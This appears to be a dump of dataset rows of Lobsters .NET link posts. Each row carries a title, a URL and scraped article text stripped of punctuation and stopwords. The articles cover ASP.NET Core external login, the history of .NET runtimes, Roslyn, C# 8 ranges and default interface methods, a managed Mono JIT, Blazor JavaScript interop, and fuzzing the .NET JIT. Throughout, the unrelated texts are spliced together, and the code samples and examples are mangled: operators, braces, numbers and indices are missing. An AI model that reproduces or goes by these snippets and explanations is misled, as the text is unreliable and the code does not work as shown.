infoprincipalclaimsappend new claim userid newuserid await usermanageraddclaimsasync newuser newuserclaims await signinmanagersigninasync newuser ispersistent false await httpcontextsignoutasync identityconstantsexternalscheme return redirect http first line signinmanagergetexternallogininfoasync retrieves user information set external login provider information stored cookie usually referred external cookie whose authentication scheme name identityconstantsexternalscheme return value info contains loginprovider string unique login provider eg google also contains another property named providerkey unique identifier user external login provider google user google profile id finally also contains list claim may vary depending external login provider configured might ask additional scope usually contain least user email name next line await signinmanagerexternalloginsigninasync check user previously logged using external login provider case method effectively sign user checking aspnetuserlogins table using loginprovider providerkey find user aspnetusers table retrieve information user create identity aspnetuserclaims aspnetroles user also deletes external cookie scenario first time user log method return failed sign result delete external cookie support visual studio template use case user redirected new account page page user forced create local account associated external login provider external cookie maintained information contained external login provider user identity used local account created new account page perfect example something would expect since method name externalloginsigninasync indicates particular function sign user using external login provider reality something specific particular use case catering need default visual studio template hence violating principle reasonable expectation also bad abstraction since need look source code fully understand return type signinmanagerexternalloginsigninasync signinresult contains boolean property named succeeded value true nothing else redirecting user angular application hosted example redirect port get start angular app ng serve happens scenario signinmanager internally call httpcontextauthenticateasync identityconstantsapplicationscheme mentioned previously sign identityconstantsextrenalscheme succeeded property false mean user associated login provider ie record aspnetuserlogins map loginprovider providerkey local user aspnetusers case need create new user associate login provider first thing get user email claim came google var email infoprincipalfindfirstvalue claimtypesemail create new instance identityuser var newuser new identityuser username email email email emailconfirmed true create user aspnetusers table var createresult await usermanagercreateasync newuser notice user password example important want support logging external login provider createresult might indicate user creation failed might happen email already used another user example let authentication proceed case user creation successful need associate new user external login provider creating new record aspnetuserlogins calling addloginasync method signinmanager newly created user information got back external login provider await usermanageraddloginasync newuser info next want save claim got external login provider aspnetuserclaims maybe add following example claim named userid added usermanagercreateasync newuserid property populated new user id var newuserclaims infoprincipalclaimsappend new claim userid newuserid await usermanageraddclaimsasync newuser newuserclaims finally use signinmanager sign user await signinmanagersigninasync newuser ispersistent false internally call httpcontextauthenticateasync identityconstantsapplicationscheme finally need sign identityconstantsexternalscheme contains information received external login provider user await httpcontextsignoutasync identityconstantsexternalscheme describe logging quick note user claim required saved first time user log claim value reused login provider claim basically ignored kind make sense think several external login provider associated user account end account aspnet core website source truth user also mean change claim external login provider creating local account change visible aspnet core website however manually manage using usermanager method handle claim removeclaimasync removeclaimsasync addclaimasync addclaimsasync handling logout action logging actually simplest need guarantee main authentication cookie identityconstantsapplicationscheme usually named aspnetcoreidentityapplication get removed use signinmanager signoutasync method method actually sign authentication scheme automatically configured call servicecollectionaddidentity startupcs calling logging redirect user page require user authenticated example redirecting user default url get host angular application using ng serve open example logout action method public async task iactionresult logout await signinmanagersignoutasync return redirect http step enough tailor example particular need let know thought comment related
231,Lobsters,dotnet,"C#, F#, .NET programming",A History of .NET Runtimes,http://www.mattwarren.org/2018/10/02/A-History-of-.NET-Runtimes/,history net runtimes,history net runtimes chris bacon dotnetanywhere alternative net runtime select group many net runtimes standard net net exedll produced c f vbnet compiler run list reference version missed runtimes please let know rest post look different runtimes detail created compare net core net standard net standard sharing code anders hejlsberg brought birth clr richard campbell available podcast working book covering subject legend net net cf net mf net micro framework hardware software people support mode dead sunsetted silverlight trying following feature mono early history post faced problem specification metadata though april ecma published file format xamarin android iosmac feb long worked together c support unity member net foundation justintime compiled aot mode since aug net native corert net runtime aot dotgnu portablenet dotnetanywhere chris bacon initial runtime coreclr cosmosos github project excellent faq quick look hood sharpos crossnet overview doc example generated code span came midori shared source common language infrastructure sscli gyro project generic added net runtime midori kernel device driver application written managed code joe duffy blogging midori tale three safety object secure capability asynchronous everything safe native code error model performance culture year concurrency singularity operating system singularity rdk kernel device driver application software written managed code redhawk corert reference,history net runtimes oct word recently fortunate enough chat chris bacon wrote dotnetanywhere alternative net runtime quipped probably one select group people written net runtime pretty cool exclude people paid work one ie microsoftmonoxamarin engineer select group got thinking many net runtimes put together list enlisted crack team highlypaid researcher aka twitter follower purpose post classifying net runtime anything implement standard net info know precise definition even way officially veryifying conformance practise mean runtimes take net exedll produced c f vbnet compiler run list made copious use wikipedia see list reference came following timeline interactive timeline working take look version missed runtimes please let know make timeline bit easier understand put runtime one following category microsoft net framework microsoft runtimes monoxamarin runtimes aheadoftime aot runtimes community project research project rest post look different runtimes detail created compare microsoft net framework original net framework started microsoft late going strong ever since recently changed course somewhat announcement net core opensource crossplatform addition creating net standard provided way different runtimes remain compatible net standard sharing code net standard set apis net implementation must provide conform standard unifies net implementation prevents future fragmentation aside want information history net really recommend anders hejlsberg brought birth clr presentation richard campbell really know tell story video also available podcast prefer working book covering subject want learn history entire net ecosystem runtimes check legend net microsoft runtimes outside main general purpose net framework microsoft also released runtimes designed specific scenario net compact framework compact net cf micro net mf framework attempt provide cutdown runtimes would run constrained device instance net cf designed run resource constrained mobileembedded device personal digital assistant pda mobile phone factory controller settop box etc net compact framework us class library full net framework also library designed specifically mobile device net compact framework control however library exact copy net framework scaled use le space net micro framework net mf even constrained resourceconstrained device least kb flash kb randomaccess memory ram includes small version net common language runtime clr support development c visual basic net debugging emulator hardware using microsoft visual studio netmf feature subset net base class library class method netmf also feature added library specific embedded application free opensource software released apache license want try scott hanselman nice writeup net micro framework hardware software people silverlight although support mode dead sunsetted depending pov interesting go back original announcement see silverlight trying silverlight cross platform cross browser net plugin enables designer developer build rich medium experience rias browser preview build released week currently support firefox safari ie browser mac window back silverlight following feature even worked linux builtin codec support playing wmv video wma audio within silverlight support ability progressively download play medium content silverlight also optionally support builtin medium silverlight enables create rich ui animation blend vector graphic html create compelling content silverlight make easy build rich video player interactive monoxamarin runtimes mono came miguel de icaza others explored possibility making net work linux mono early history came first important question mono mean end technology help linux succeed desktop post also talk started mono side event approximately like soon net document came december got really interested technology started everyone start byte code interpreter faced problem specification metadata though last modification early vm source done january around time started posting net mailing list asking missing information metadata file format time sam ruby pushing ecma committee get binary file format published something part original agenda know thing developed april ecma published file format time mono xamarin branched wider area run android iosmac acquired microsoft feb addition unity monoxamarim long worked together provide c support unity unity member net foundation aheadoftime aot runtimes wanted include aot runtimes seperate category traditionally net justintime compiled time aheadoftime compilation option available far tell mono first aot mode since aug recently microsoft released net native working corert net runtime aot community project however net runtimes developed microsoft company later acquired community owned one oldest dotgnu portablenet started time mono goal build suite free software tool compile execute application common language infrastructure cli secondly dotnetanywhere work one person chris bacon dotnetanywhere claim fame provided initial runtime blazor project however also excellent resource want look make net compatibleruntime time wade million linesofcode make coreclr next come cosmosos github project net runtime managed operating system want see achieves recommend reading excellent faq taking quick look hood another similar effort sharpos finally recently stumbled across crossnet take different approach par net assembly generates unmanaged c code compiled standard c compiler take look overview doc example generated code learn research project finally onto esoteric net runtimes research project run microsoft aim seeing far extend managed runtime used research work made way back commercialshipping net runtimes instance span came midori shared source common language infrastructure sscli aka rotor microsoft shared source implementation cli core net although sscli suitable commercial use due license make possible programmer examine implementation detail many net library create modified cli version microsoft provides shared source cli reference cli implementation suitable educational use interesting sideeffect releasing rotor also able release gyro project give idea generic added net runtime midori midori code name managed code operating system developed microsoft joint effort microsoft research reported possible commercial implementation singularity operating system research project started build highly dependable operating system kernel device driver application written managed code designed concurrency could run program spread across multiple node also featured security model sandbox application increased security microsoft mapped several possible migration path window midori operating system discontinued time though many concept rolled microsoft project midori project appears led idea making way back net framework read joe duffy excellent series blogging midori tale three safety object secure capability asynchronous everything safe native code error model performance culture year concurrency singularity operating system also singularity rdk singularity experimental operating system o built microsoft research designed high dependability o kernel device driver application software written managed code internal security us type safety instead hardware memory protection last least redhawk codename experimental minimal managed code runtime evolved corert reference wikipedia article referenced creating timeline
232,Lobsters,dotnet,"C#, F#, .NET programming",How Microsoft rewrote its C# compiler in C# and made it open source,https://medium.com/microsoft-open-source-stories/how-microsoft-rewrote-its-c-compiler-in-c-and-made-it-open-source-4ebed5646f98,microsoft rewrote c compiler c made open source,microsoft rewrote c compiler c made open source project roslyn roslyn f software foundation roslyn open source project net foundation http githubcomdotnetroslyn http githubcomdotnetcsharplang,microsoft rewrote c compiler c made open sourceproject roslynroslyn codenamethatstuck opensource compiler c visual basicnet started deepest darkness last decade corporate microsoft became open source crossplatform public language engine thing c vb take given rest piece first conversation would become roslyn already ongoing joined microsoft net would ship conversation rewriting c c normal practice programming language proof point maturity language practical important motivation creator c programming c coding c working c every day make think differently c power dogfooding customer depend new compiler behaving exactly way old one writing new compiler c mean trying match old compiler bugforbugthe challenge rewriting compiler hand customer several year customer depend new compiler behaving exactly way old one writing new compiler c mean trying match old compiler bugforbug talking known bug unknown unintended behavior developer found come rely often unknowinglyfor year sheer magnitude challenge kept u even embarking projectalso would many benefit inside language team new c compiler written c value proposition customer challenging would new compiler help existing customer perhaps people would care c written c would member compiler teamat time though another problem growing bigger duplication effort different tool working c code besides compiler sister team building ide support c visual studio also write ream code also time c understand c syntax semanticsbeyond growing number tool microsoft others stylecop coderush etc implement meaningful codebased tool starting flat c source text would subtly different bug different level understanding different compromise tradeoff would expend lot lot effort get square one understanding codehere finally value proposition make need one code base world understands c shared everyone want build tool code finally value proposition make need one code base world understands c shared everyone want build tool code customer value would follow increase available tool especially quality existing tool would put language correctness performance demand single code base expend effort make stellar quality massive versatility would build language engine unified public api c code would redefine meaning compiler course building api broad c community kind slamdunk net api implemented c old dream bootstrapping c c fulfilled almost accidental side benefitroslyn thus born openness mindset sharing inner working c world programmatically consume bit bold step still pervasively closed cultureroslyn thus born openness mindset sharing inner working c language world programmatically consume bit bold proposition still pervasively closed culture microsoft would share intellectual property free would empower tool builder u better compete u argument day u strengthening ecosystem becoming best tooled language planet longterm growth c net versus short term monetization protection asset microsoft even without mentioned open source signing cost risk roslyn project big bold step microsoftof course build something like roslyn vision highly ambitious fraught technical challenge well took u half decade fulfill story another dayever since project began earnest vision making compiler open source microsoft simply ready yetfor time building initial version roslyn still closedsource project ever since project began earnest vision making compiler open source microsoft simply ready yet culture developing private filing patent around original code represented microsoft working since change air going happen slowly team hopedin fact felt like company going totally opposite directionthe window project pretty much took whole company new programming model tentacle reached deeply developer tool language team everything blanketed extreme secrecy towards outside even within company example async feature developing time coordinated enmeshed window programming model dare publish design note even internally fear accidentally leaking information window getting trouble created terrible climate innovation certainly bode well hope open sourcing c compilereventually though window run course company started transform found new direction towards new leadership different core philosophy microsoft know today open source movement rapidly started take hold inside microsoftf released already open source license foundation f software foundation vibrant community grew around soon became envy u team pushed strongly open source production license roslyn finally companywide infrastructure emerged make realby microsoft created microsoft open tech organization specifically focused open source project roslyn moved microsoft open tech officially became open source strong candidate development resource internal wellknown project stood without lot dependency might create licensing conflictsin april microsoft build developer event san francisco anders hejlsberg showed roslyn open source project roslyn published april codeplex microsoft since retired open source hosting platform apache licenseproject roslyn codeplex microsoft open techat time net foundation announced home net project including roslynbeing open magnificent breath fresh air even started reap benefit openness codeplex remaining procedural open source hurdle microsoft straightened today open source straightforward integral part work across many teamswe longer treat github publishing venue simply workalso front company realize need control everything became clear good reason codeplex world roslyn joined project migrating codeplex github de facto home open source project source code process building github treat publishing venue simply workroslyn github todayc language design compiler implementation completely open process lot nonmicrosoft participation including whole language feature built external contributor value c roof scaling effort via contribution feature bug fix also insight course correction get instant daily feedback loop open source providesit long wild journey one symbolic massive change microsoft undergone last decade nugget roslyn started dark grew idea openness exploded million different us today power open sourceexplore roslyn pitch c language design http githubcomdotnetroslynhttps githubcomdotnetcsharplang
233,Lobsters,dotnet,"C#, F#, .NET programming",C# 8 Concerns,http://benbowen.blog/post/csharp_8_concerns/,c concern,game c proposal champion slicing range discussion view code fullscreen edit jared par confirmed reddit nonconstants permitted range expression personally think make feature actually strong allow certain algorithm written much greater terseness view code fullscreen view code fullscreen however exclusive view code fullscreen reply reddit comment uthebuzzsaw c proposal default interface method c tour default interface method trait diamond death multiple inheritance always bad thing tour post default behaviour implicitly imported class view code fullscreen view code fullscreen view code fullscreen demonstrated year ago use interface leaf,following post going talk two concern feature planned c beforehand though want point couple thing c continue favourite generalpurpose language fact would nt writing post nt care c making point think definitely know better concern nt seen adequately addressed thus far actually semihope someone reply reason concern illfounded also really exciting feature planned c opinion including nonnullable reference record type async stream improvement pattern matching none going talking also previous subscriber sorry huge hiatus blogging busy work spare time going patching game finally done however hopefully normal service resumed anyway let crack c proposal champion slicing range discussion proposal essentially adding two new operator c public static void main var intarray new var arraysubrange intarray array subrange view intarray includes value var lastelement intarray lastelement view code fullscreen slicing hat operator proposed syntax range operator selects subrange indexed collection moment consensus returned object would kind struct implement ienumerable would simply view source collection invoke copy operation targeted element hat operator index target collection end sequence rather start firstly think overall proposal generally good thing convinced something people cry although decide allow nonconstants range expression eg var arraysubrange intarray startindex endindex certainly reevaluate opinion edit jared par confirmed reddit nonconstants permitted range expression personally think make feature actually strong allow certain algorithm written much greater terseness issue hat operator endelement range operator currently exclusive ie intarray return view onto element get last element array correct syntax intarray intarray think main justification intuitively support following scenario const int arraysize public static void main var intarray new arraysize var arraysubrange intarray arraysize arraysubrange intarray result view code fullscreen potential ioobexception exclusive indexing code work nicely whereas inclusive indexing need arraysize const int arraysize public static void main var intarray new arraysize var arraysubrange intarray arraysubrange intarray result view code fullscreen ioobexception inclusive indexing however personally think pattern many veteran programmer familiar yes le terse alternative think already collective understanding amongst coder collection end furthermore exclusive default currently proposed make algorithm le intuitive take example function determines whether string palindrome taken inclusive indexing public static bool ispalindrome string input int inputlength input input return false return true exclusive indexing public static bool ispalindrome string input int inputlength input input return false return true view code fullscreen hat operator palindrome func example perfectly highlight underlying issue programmer used collection violating assumption counterintuitive even talking new operator word indexing back nt mean go habitual behaviour sequence start another example reverse sequence eg var reversed intarrayreverse toarray get last element original array reversed access element back hatoperator use intarray discussion actually still ongoing github got chance ask mads torgersen c language project manager via recent net conf live stream reply indicated intarray currently planned point past end array ie intarray always throw indexoutofboundsexception one justification gave mean range expression intarray intuitively return entire array contention kind circular logic hat range operator inclusive still get nice result problem would occur hatoperator inclusive range operator remained exclusive one sidenote like add nt see particularly cutanddry issue tried present case operator inclusive open idea someone might show convincing reason wrong please form opinion also particularly comfortable realm disagreeing mads torgersen something oh well nt stick neck sometimes never see fence also good argument concern see example reddit comment uthebuzzsaw pretty important range inclusivebegin exclusiveend empty range exclusiveend make many many operation really simple processing fixed width chunk simply add chunk size inclusiveend would result c proposal default interface method c tour default interface method prize guessing one gon na come honest think communityinvested c programmer well aware proposal already strong opinion nt know simply follow link firstly let start saying actually generally onboard idea way getting trait c something many many modern language already lot people argued change meaning interface andor already abstract class purpose andor form multiple inheritance meaning interface change isandremains construct forwarddeclares set method class must implement instance usable thing interface represents certain method interface default implementation nt mean thing outside consumer interface implementer interface need worry abstract class contain state class remain onlysingularlyinheritable issue would arise infamous diamond death interface contain state property state method look like state therefore retain completely distinct useful value c multiple inheritance always bad thing received bad name wildwest day c trait form mi used daily great success also issue people ca nt claim opinion suggest reading comment tour post really one concern big one proposal touted implementation trait c opinion lousy one default behaviour implicitly imported class example interface ientity interface representing entity game world position get interface isoundemittingentity ientity represents entity emits sound float soundradius get method default sensible implementation overridden complex case bool isaudibletoplayer player player playerposition position soundradius class rocket isoundemittingentity public position get private set public float soundradius get unitsinmetres void somemethod rocket rocket rocketisaudibletoplayer playsound soundsrocketsound view code fullscreen trait example problem code wo nt compile isaudibletoplayer explicitly imported rocket even default implementation currently proposed syntax would class rocket isoundemittingentity public position get private set public float soundradius get unitsinmetres public bool isaudibletoplayer player player isoundemittingentitybaseisaudibletoplayer player view code fullscreen current trait proposal frankly nt find particularly useful nt really resemble trait implementation familiar already implement almost identical pattern available today interface ientity position get interface isoundemittingentity ientity float soundradius get bool isaudibletoplayer player player public static class soundemittingentitydefaultimplprovider public static bool defaultisaudibletoplayer isoundemittingentity player player return playerposition thisposition thissoundradius class rocket isoundemittingentity public position get private set public float soundradius get unitsinmetres public bool isaudibletoplayer player player thisdefaultisaudibletoplayer player view code fullscreen trait example fact extension method actually get even closer real trait demonstrated year ago current response microsoft use interface leaf ie using irocket everywhere instead rocket using actual rocket class instantiate nt make much sense nt see better still awkwardly reimport default behaviour somewhere yet leaf interface still look though done automatically furthermore envision order magnitude leaf trait type probably way trouble worth finally way reducing boilerplatecode duplication existing pattern like one enumerated already exist already terse imo personally feel like default interface method proposal actually primarily support entirely different usecase allowing interface modified going public compatibility language like java far understand would make xamarin user life lot easier wish microsoft would either drop whole claim support trait entirely proposal embrace fully fact nt primary objective revisit applicability trait implementation least allow u kind syntax autoimport default member eg something like importdefaults typeof isoundemittingentity class rocket isoundemittingentity hopefully making standard behaviour thanks reading edit sep jared par confirmed reddit nonconstants permitted range expressionsedit sep fixed error trait code replaced isaudibletoplayer defaultisaudibletoplayer edit sep fixed error showing inclusive v exclusive difference range selectionedit sep added link uthebuzzsaw reddit comment sidenote subheading range operator section
234,Lobsters,dotnet,"C#, F#, .NET programming",Writing a JIT Compiler in C#,https://www.mono-project.com/news/2018/09/11/csharp-jit/,writing jit compiler c,motivation jikesrvm maxime graal managed jit http githubcomlambdageekmonotreemjitmcsclassmonocompiler interfacing mono runtime interpreter bigstep compiler bigstep hosted compiler mjit branch native managed native wrapping mini jit conclusion gitter channel appendix converting stackbased opcodes register operation llvmsharp,microsoft hack week member mono team explored idea replacing mono code generation engine written c code generation engine written c blog post describe motivation interface native mono runtime managed compiler implemented new managed compiler c motivation mono runtime jit compiler entirely written c highly portable language served project well yet feel jealous user get write code highlevel language enjoy safety luxury reap benefit writing code highlevel language mono runtime continues written c decided explore whether could make mono compilation engine pluggable plug code generator written entirely c work could easily prototype write new optimization make simpler developer safely try change jit idea explored research project like jikesrvm maxime graal java net world unity team wrote il compiler c compiler called also experimented managed jit recently blog post discus prototype built code mentioned blog post found http githubcomlambdageekmonotreemjitmcsclassmonocompiler interfacing mono runtime mono runtime provides various service justintime compilation assembly loading io interface thread management debugging capability code generation engine mono called mini used static compilation justintime compilation mono code generation number dimension code either interpreted compiled native code compiling native code done justintime batch compiled also known aheadoftime compilation mono today two code generator light fast mini jit engine heavy duty engine based llvm optimizing compiler two really completely unaware mono llvm support reuses many part mini engine project started desire make division even clear swap native code generation engine mini one could completely implemented net language prototype used c language like f ironpython could used well move jit managed world introduced icompiler interface must implemented compilation engine invoked demand specific method need compiled interface must implement interface icompiler compilationresult compilemethod iruntimeinformation runtimeinfo methodinfo methodinfo compilationflags flag nativecodehandle nativecode string name get compilemethod receives iruntimeinformation reference provides service compiler well methodinfo represents method compiled expected set nativecode parameter generated code information nativecodehandle merely represents generated code address length iruntimeinformation definition show method available compilemethod perform work interface iruntimeinformation installedruntimecode installcompilationresult compilationresult result methodinfo methodinfo nativecodehandle codehandle object executeinstalledmethod installedruntimecode irc params object args classinfo getclassinfofor string classname methodinfo getmethodinfofor classinfo classinfo string methodname fieldinfo getfieldinfofortoken methodinfo mi int token intptr computefieldaddress fieldinfo fi given array type get offset vector relative base address uint getarraybaseoffset clrtype type currently one implementation icompiler call bigstep compiler wired process look like compile method mini runtime call managed code via compilemethod upon compilation request code generator work need obtain information current environment information surfaced iruntimeinformation interface compilation done return blob native instruction runtime returned code installed application trick question going compile compiler compiler written c initially executed one builtin engine either interpreter jit engine bigstep compiler first icompiler implementation called bigstep compiler compiler designed implemented developer ming zhou affiliated mono runtime team perfect showcase work presented project quickly enable thirdparty build compiler without much hassle interacting runtime internals bigstep compiler implement il llvm compiler convenient build proof concept ensure design sound delegating hard compilation work llvm compiler engine lot said come design architecture compiler main point emphasize easy introduced mono runtime bridge il code customized backend il code streamed compiler interface iterator information opcode index parameter immediately available user see detail prototype hosted compiler another beauty moving part runtime managed side test jit compiler without recompiling native runtime essentially developing normal c application installcompilationresult used register compiled method runtime executeinstalledmethod used invoke method provided argument example used code public static int addmethod int int b return b test public void testaddmethod classinfo ci runtimeinfogetclassinfofor typeof icompilertests assemblyqualifiedname methodinfo mi runtimeinfogetmethodinfofor ci addmethod nativecodehandle nativecode compilationresult result compilercompilemethod runtimeinfo mi compilationflagsnone nativecode installedruntimecode irc runtimeinfoinstallcompilationresult result mi nativecode int addition int runtimeinfoexecuteinstalledmethod irc assertareequal addition ask host vm actual result assuming gold standard int mjitresult int runtimeinfoexecuteinstalledmethod irc int hostedresult addmethod assertareequal mjitresult hostedresult eas development compiler tremendously need eat dog food debugging feel ready flip switch use compiler system compiler actually happens run make c mcsclassmonocompiler runtest mjit branch use api test managed compiler running regular mini jit native managed native wrapping mini jit icompiler part effort also wrapped mono jit icompiler interface minicompiler call back native code invokes regular mini jit work surprisingly well however caveat back native world mini jit need go iruntimeinformation us old way retrieve runtime detail though turn incremental process identify part add iruntimeinformation change mini jit us new api conclusion strongly believe longterm value project code base managed code approachable developer thus easier extend maintain even never see work upstream helped u better understand boundary runtime jit compiler know might help u integrate ryujit mono one day also note iruntimeinformation implemented net vm hello coreclr folk curious project ping u gitter channel appendix converting stackbased opcodes register operation since target language llvm ir build translator converted stackbased operation il registerbased operation llvm since many potential target register based decided design framework make reusable part interpret il logic goal implemented engine turn stackbased operation register operation consider add operation il operation pop two operand stack performing addition pushing back result stack documented ecma follows stack transition result actual kind addition performed depends type value stack value integer addition integer addition value floating point value operation floating point addition reinterpret registerbased semantics treat pushed frame stack different temporary value mean frame popped new one come although stack depth previous one new temporary value temporary value assigned unique name il instruction unambiguously presented form using temporary name instead stack change example add operation becomes add coming stack source data evaluation local variable argument constant instruction offset used branching source typed differently stack temporary downstream processor talk properly map context third problem might common among target language jumping target branching operation il branching operation assumes implicit target result taken next instruction branching operation llvm ir must explicitly declare target taken nottaken path make possible engine performs prepass actual execution gather explicit implicit target actual execution emit branching instruction target mentioned earlier execution engine common layer merely translates instruction generic form sends instruction ioperationprocessor interface performs actual translation comparing instruction received icompiler presentation operationinfo much consumable addition op code array input operand result operand public class operationinfo internal ioperand operand get set internal tempoperand result get set several type operand argumentoperand localoperand constoperand tempoperand branchtargetoperand etc note result exists always tempoperand important property ioperand name unambiguously defines source data il runtime operand name come another operation unquestionably tell u data address targeted paramount processor accurately map name storage processor handle operand according type example argument operand might consider retrieving value corresponding argument processor may map register case llvm simply go fetch named value preallocated beginning method construction resolution strategy similar operand localoperand fetch value preallocated address constoperand use const value carried operand branchtargetoperand use index carried operand since temp value uniquely represents expression stack frame clr runtime mapped register luckily u llvm allows infinite number register simply name new one different temp operand temp operand reused however register must well use llvmsharp binding communicate llvm
235,Lobsters,dotnet,"C#, F#, .NET programming",Working with the Blazor JavaScript Interop,https://blog.logrocket.com/working-with-the-blazor-javascript-interop-3c2a8d0eb56c,working blazor javascript interop,ed charbeneau working blazor javascript interop blazor mono webassembly bring net browser using mono runtime javascript interop backwards compatibility bootstrap toastrjs chartjs kendo ui mind gap conclusion logrocket full visibility web apps logrocket try free,ed charbeneau follow ed charbeneau sr developer advocate blazor telerik product progress microsoft mvp http edcharbeneaucom working blazor javascript interop september min read article look blazor singlepage web app framework built net run browser webassembly get understanding blazor handle javascript call necessary used webassembly abbreviated wasm gaining momentum important understand current capability webassembly lack ability directly access browser dom api however make call javascript shortcoming javascript still much part web development blazor mono webassembly webassembly wasm binary instruction format designed provide compilation target highlevel language like c recently microsoft began experimenting webassembly bring net browser using mono runtime mono provides basic plumbing allowing net library dll run webassembly block diagram blazor browser relationship blazor feature component architecture routing virtual dom javascript interoperability interop api javascript interop blazor app invoke javascript function net c method javascript code call javascript net ijsruntime abstraction used current instance ijsruntime resolved making call jsruntimecurrent instance call invokeasync method passing first argument identifier corresponding javascript function would like invoke function must available global scope window additional argument may passed javascript function provided json serializeable well return type task using microsoftjsinterop public class examplejsinterop public static task methodname targs args implemented examplejsinteropjs return jsruntimecurrentinvokeasync scopejsmethod args javascript interop since blazor built upon mono webassembly therefore direct access browser dom api must marshal call javascript need dom access inclusion javascript stack beneficial term necessity also flexibility backwards compatibility including javascript stack enables blazor application utilize existing javascript library includes ui library like bootstrap toastrjs toast notification library chartjs simple charting component addition fullfeatured commercial ui library kendo ui could potentially ported blazor port essentially provide c api surface interacting underlying javascript providing migration path user mind gap blazor new experimental interop allows developer fall back javascript shortcoming webassembly blazor framework yet mature example wanted use standard window prompt method native support blazor however simple api created using javascript interop add support functionality start creating javascript file method would like invoke application function visible blazor need add scope window best practice additional namespaces added using module pattern protects method conflicting code scope window within namespace define function call native window prompt method windowmynamespace showprompt function message return prompt message type anything anotherfunction function args stuff next need invoke javascript showprompt function within c using jsruntimecurrentinvokeasync method c function promptasync provides nice abstraction used within blazor application developer using abstraction need understand underlying javascript implementation using microsoftjsinterop public class promptinterop summary invokes browser prompt return user input summary public static task string promptasync string message return jsruntimecurrentinvokeasync string mynamespaceshowprompt message since blazor ui process capable running separate thread application invokeasync used default however need invoke javascript method synchronously provide functionality downcasting jsruntime ijsinprocessruntime adding prompt method addition promptasync provides alternative api asynchronous behavior available using microsoftjsinterop public class promptinterop summary invokes browser prompt return user input summary public static task string promptasync string message return jsruntimecurrentinvokeasync string mynamespaceshowprompt message summary syncronously invokes browser prompt return user input use inprocesssenarios summary public static string prompt string message return ijsinprocessruntime jsruntimecurrent invoke string mynamespaceshowprompt message showprompt method available use within application call promptasync blazor component calling method awaiting result following example trigger browser prompt user click component prompt closed result returned component message field databound rendered component ensure new value updated databinding occurs call statehaschanged instruct blazor rerender component div onclick handleclick class mycomponent message div function string message click change async void handleclick message await promptinteroppromptasync type message statehaschanged blazor javascript interop providing browser prompt conclusion blazor webassembly lack ability directly access browser dom api javascript interop provides mean filling gap interop make possible migrate existing javascript library blazor interop developer create abstraction around browser feature providing c method add functionality application level blazor gain popularity reasonable assume ecosystem interop library emerge interop library become available blazor developer may spend le time writing javascript time c logrocket full visibility web apps logrocket frontend application monitoring solution let replay problem happened browser instead guessing error happen asking user screenshots log dump logrocket let replay session quickly understand went wrong work perfectly app regardless framework plugins log additional context redux vuex ngrxstore addition logging redux action state logrocket record console log javascript error stacktraces network requestsresponses header body browser metadata custom log also instrument dom record html cs page recreating pixelperfect video even complex singlepage apps try free
237,Lobsters,dotnet,"C#, F#, .NET programming",Fuzzing the .NET JIT Compiler,http://www.mattwarren.org/2018/08/28/Fuzzing-the-.NET-JIT-Compiler/,fuzzing net jit compiler,fuzzing net jit compiler excellent fuzzlyn project languagebased security course aarhus university wikipedia page fuzzing fuzz testing program try create find compiler jakob botsch nielsen chris schmidt jonas larsen compilation net compilation net framework intermediate language il justintime jit compiler relevant debug release roslyn compiler optimize switch change huge amount emitting generation logic rely upon jitter heavy lifting optimization inlining il loop unrolling interprocedural analysis place get real win optimising compiler aot scenario time release version debug version sharplab codegen difference mean fuzzlyn project actually finding bug net jit roslyn compiler finally block belonging unexecuted try run anyway fixed work optimisation fully optimised debug friendly excellent tutorial design doc usage compdbgcode flag randomly check reduce original source reduced version original code simplified version random code generation supported construct listed probability table empirically similar project shown larger program better small program get many opportunity generate lot pattern dotnetcoreclr strived generator produce code looked relatively like human code checking bug checksumrelated code jakob explains reducing output large initial version much readable binary search technique roslyn syntax tree api coarsestatementremover class designed allow syntax rewriting using csharp syntax rewriter result great name impressive result saw getting project readme github issue created jakobbotsch summary wait upgrading net nick craver first rule programming always fault select broken hacker news rdotnet rcsharp reading,fuzzing net jit compiler aug word recently came across excellent fuzzlyn project created part languagebased security course aarhus university per project description fuzzlyn fuzzer utilizes roslyn generate random c program fuzzer wikipedia page fuzzing fuzzing fuzz testing automated software testing technique involves providing invalid unexpected random data input computer program word fuzzer program try create source code find bug compiler massive kudos developer behind fuzzlyn jakob botsch nielsen helped answer question writing post chris schmidt jonas larsen impressive project clear link project take credit compilation net dive fuzzlyn going take quick look compilation net framework write c vbnetf code delete appropriate compile compiler convert intermediate language il code il stored exe dll common language runtime clr read executes program actually run however job justintime jit compiler convert il code machine code relevant fuzzlyn work comparing output debug release version program different bug turn optimisation actually done roslyn compiler compared jit eric lippert excellent post optimize switch optimize flag change huge amount emitting generation logic try always generate straightforward verifiable code rely upon jitter heavy lifting optimization generates real machine code simple optimization flag set example flag set go list thing c compiler optimise finishing pretty much straightforward optimization inlining il loop unrolling interprocedural analysis whatsoever let jitter team worry optimizing heck code actually spit machine code place get real win net technique optimising compiler us done compiletime almost done runtime jit compiler leaving aside aot scenario time reference difference il make code easier debug instance given c code public void foreach var item new consolewriteline item difference il shown release left debug right see extra nop instruction allow debugger stepthrough location code plus extra local variable make easierpossible see value debugging click larger image view release version debug version excellent sharplab information difference releasedebug codegen see release optimized section doc codegen difference also roslyn opensource see handled code mean fuzzlyn project actually finding bug net jit roslyn compiler well except one finally block belonging unexecuted try run anyway fixed work simplest level fuzzlyn work compiling running piece randomly generated code debug release version comparing output version produce different result bug specifically bug optimisation jit compiler attempted net jit known ryujit several mode produce fully optimised code highestperformance produce debug friendly code optimisation much simpler find different optimisation ryujit performs excellent tutorial design doc search code usage compdbgcode flag highlevel fuzzlyn go following step randomly generate c program check code produce error debug v release reduce code simplest form want see action ran fuzzlyn produced randomly generated program bug see original source loc reduced version loc interesting clearly see buggy lineofcode original code turned simplified version generated fuzzlyn seed reduced kib kib debug print line release print line public class program static short static byte static int new int static short public static void main comparision bug debug false release true however ushort debug release ushort bool systemconsolewriteline random code generation fuzzlyn produce every type c program however support quite language feature supported construct fuzzlyn generates limited subset c importantly support loop yet support structs class though generate member method make attempt fully support kind expression statement see code generator follow link statement expression currently supported listed interestingly enough type statementexpression chosen completely random instead chosen using probability table look like public probabilitydistribution statementtypedist get set new tabledistribution new dictionary int double int statementkindassignment int statementkindif int statementkindblock int statementkindcall int statementkindtryfinally int statementkindreturn saw initial program fuzzlyn produce quite large loc create execute large program partly quicker compared working lot smaller program ie step generation compilation starting new process reduced running large program addition jakob explained reason empirically similar project shown larger program better csmith author report bug found example around kb remember exact number actually found thing example average size kb small program get many opportunity generate lot pattern example unlikely small program method taking byte parameter time method returning ref byte pattern 